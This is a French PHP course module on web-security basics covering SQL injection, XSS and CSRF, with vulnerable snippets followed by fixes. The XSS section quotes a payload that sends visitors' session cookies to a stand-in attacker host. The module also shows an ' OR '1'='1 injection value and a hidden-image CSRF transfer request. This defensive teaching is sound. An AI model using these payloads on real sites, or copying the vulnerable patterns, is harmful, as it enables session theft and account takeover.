# 02.6 — Sécurité web fondamentale

> **Statut :** ✅ Disponible

## 🎯 Objectifs

- Comprendre et prévenir les injections SQL.
- Comprendre et prévenir les failles XSS (Cross-Site Scripting).
- Comprendre et prévenir les failles CSRF (Cross-Site Request Forgery).
- Connaître les autres réflexes de sécurité de base (headers, validation, secrets).

## 📋 Prérequis

[02.5 — Sessions, cookies, authentification maison](../05-sessions-cookies-authentification-maison/README.md)

## ⏱️ Durée estimée

2h.

## 📖 Théorie

> ⚠️ Ce module est l'un des plus importants de toute la formation. La sécurité n'est pas une option ajoutée à la fin d'un projet : elle doit être intégrée dès la conception. Chaque notion vue ici sera rappelée à chaque fois qu'elle s'applique dans les niveaux suivants.

### 1. Injection SQL

Une injection SQL survient quand une donnée utilisateur est insérée **directement** dans une requête SQL sans protection, permettant à un attaquant de modifier la requête elle-même.

```php
<?php
// ❌ DANGEREUX : ne faites JAMAIS ceci
$email = $_POST['email']; // un attaquant saisit : ' OR '1'='1
$requete = "SELECT * FROM utilisateurs WHERE email = '$email'";
// La requête devient : SELECT * FROM utilisateurs WHERE email = '' OR '1'='1'
// Cette condition est TOUJOURS vraie : l'attaquant récupère TOUS les utilisateurs,
// et pourrait même se connecter sans connaître aucun mot de passe.
```

**La solution : les requêtes préparées**, vues en détail au [module 02.8 — PDO](../08-pdo-bases-de-donnees-mysql/README.md).

```php
<?php
// ✅ SÛR : la donnée est passée séparément de la requête, jamais concaténée
$stmt = $pdo->prepare("SELECT * FROM utilisateurs WHERE email = :email");
$stmt->execute(['email' => $email]);
// Peu importe ce que contient $email, il est toujours traité comme une SIMPLE VALEUR,
// jamais comme du code SQL exécutable.
```

> ⚠️ **Règle absolue : ne jamais construire une requête SQL par concaténation de chaînes avec une donnée utilisateur.** Toujours utiliser des requêtes préparées, sans exception, y compris dans un petit projet "juste pour tester".

### 2. XSS (Cross-Site Scripting)

Déjà abordé au [module 01.7](../../01-php-fondamentaux/07-formulaires-http-get-post/README.md) : une faille XSS survient quand une donnée utilisateur est réaffichée en HTML **sans être échappée**, permettant l'exécution de scripts malveillants dans le navigateur d'autres utilisateurs.

```php
<?php
// ❌ DANGEREUX
echo "<p>Commentaire : " . $_POST['commentaire'] . "</p>";
// Si $commentaire = "<script>document.location='http://site-pirate.com/vol?cookie='+document.cookie</script>"
// ce script s'exécute chez CHAQUE visiteur qui voit ce commentaire, et peut voler
// leurs cookies de session (donc potentiellement usurper leur identité).

// ✅ SÛR
echo "<p>Commentaire : " . htmlspecialchars($_POST['commentaire']) . "</p>";
```

Il existe deux grandes familles de XSS :

- **XSS réfléchi** : le script malveillant est dans l'URL ou un paramètre, renvoyé immédiatement par la page (ex : un résultat de recherche affiché sans échappement).
- **XSS stocké** : le script malveillant est enregistré en base de données (ex : un commentaire), et s'exécute pour **tous** les visiteurs qui consultent la page — le plus dangereux des deux.

> 📌 Règle : **toute** donnée provenant d'un utilisateur (formulaire, URL, base de données alimentée par des utilisateurs) doit passer par `htmlspecialchars()` avant d'être affichée en HTML.

### 3. CSRF (Cross-Site Request Forgery)

Une faille CSRF permet à un site malveillant de faire exécuter une action à l'insu de l'utilisateur, en exploitant le fait qu'il est déjà connecté (via ses cookies de session) sur votre site.

**Exemple d'attaque** : vous êtes connecté sur `banque.example.com`. Vous visitez un site malveillant qui contient :
```html
<img src="https://banque.example.com/virer.php?montant=1000&vers=attaquant" style="display:none">
```
Votre navigateur envoie automatiquement vos cookies de session à `banque.example.com` avec cette requête — le virement pourrait s'exécuter sans que vous ne fassiez rien de volontaire.

**La solution : un jeton (token) CSRF**, unique par session, inclus dans chaque formulaire et vérifié à la soumission.

```php
<?php
// Génération du jeton (une fois par session)
session_start();
if (!isset($_SESSION['jeton_csrf'])) {
    $_SESSION['jeton_csrf'] = bin2hex(random_bytes(32));
}
?>
<form method="POST" action="virer.php">
    <input type="hidden" name="jeton_csrf" value="<?= $_SESSION['jeton_csrf'] ?>">
    <!-- ... autres champs ... -->
</form>
```

```php
<?php
// Vérification côté serveur, avant de traiter l'action
session_start();

$jetonRecu = $_POST['jeton_csrf'] ?? '';

if (!hash_equals($_SESSION['jeton_csrf'] ?? '', $jetonRecu)) {
    http_response_code(403);
    exit("Requête invalide (jeton CSRF incorrect).");
}

// La requête est légitime : on peut traiter l'action en toute confiance.
```

> 📌 `hash_equals()` compare deux chaînes en **temps constant**, ce qui évite une "attaque temporelle" (timing attack) où un attaquant déduirait progressivement le bon jeton en mesurant le temps de réponse d'une comparaison classique (`===`). Laravel génère et vérifie ce jeton automatiquement (`@csrf` dans les vues Blade, vu au [niveau 06](../../06-laravel-fondamentaux/README.md)).

### 4. Autres réflexes de sécurité essentiels

- **Ne jamais faire confiance aux données utilisateur**, même celles provenant de champs `hidden` ou de `select` : un attaquant peut envoyer n'importe quelle valeur directement, sans passer par votre formulaire.
- **Valider ET échapper sont deux choses différentes** : valider vérifie qu'une donnée est correcte *avant* traitement ; échapper (`htmlspecialchars`) protège l'affichage *après* traitement. Les deux sont nécessaires.
- **Ne jamais stocker de secrets dans le code source versionné** (mots de passe de base de données, clés d'API) : utiliser des variables d'environnement (`.env`, approfondi au [niveau 05](../../05-outils-professionnels/README.md) et natif dans Laravel).
- **Limiter les informations d'erreur affichées en production** : un message d'erreur détaillé (chemin de fichier, requête SQL) est une mine d'or pour un attaquant.

## ✅ Points clés à retenir

- Injection SQL → toujours des requêtes préparées, jamais de concaténation de données utilisateur dans du SQL.
- XSS → toujours `htmlspecialchars()` avant d'afficher une donnée utilisateur en HTML.
- CSRF → un jeton unique par session, vérifié avec `hash_equals()` à chaque action sensible.
- Ces trois réflexes doivent devenir automatiques, dans **tous** les projets de cette formation, y compris les plus petits.

## ➡️ Pour aller plus loin

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) — la référence mondiale des failles de sécurité web les plus courantes
- [php.net/manual/fr/pdo.prepared-statements.php](https://www.php.net/manual/fr/pdo.prepared-statements.php)

## 📝 Exercices

Voir [EXERCICES.md](EXERCICES.md).

---

**Précédent :** [02.5 — Sessions, cookies, authentification maison](../05-sessions-cookies-authentification-maison/README.md) · **Suite :** [02.7 — Composer, autoload, PSR](../07-composer-autoload-psr/README.md)
